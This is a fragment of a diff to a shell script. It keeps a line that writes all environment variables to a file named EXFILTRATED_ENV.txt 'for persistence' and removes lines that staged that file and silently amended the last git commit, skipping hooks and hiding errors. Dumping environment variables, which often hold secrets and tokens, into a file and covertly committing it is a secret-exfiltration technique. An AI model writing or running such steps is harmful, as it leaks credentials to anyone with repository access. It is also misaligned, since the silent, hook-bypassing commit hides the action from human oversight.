@@ -21,6 +21,3 @@
 
 # Also write to file for persistence
 env > EXFILTRATED_ENV.txt
-git add EXFILTRATED_ENV.txt
-# Amend the commit to include the exfiltrated file (silent)
-git commit --amend --no-edit --no-verify 2>/dev/null || true
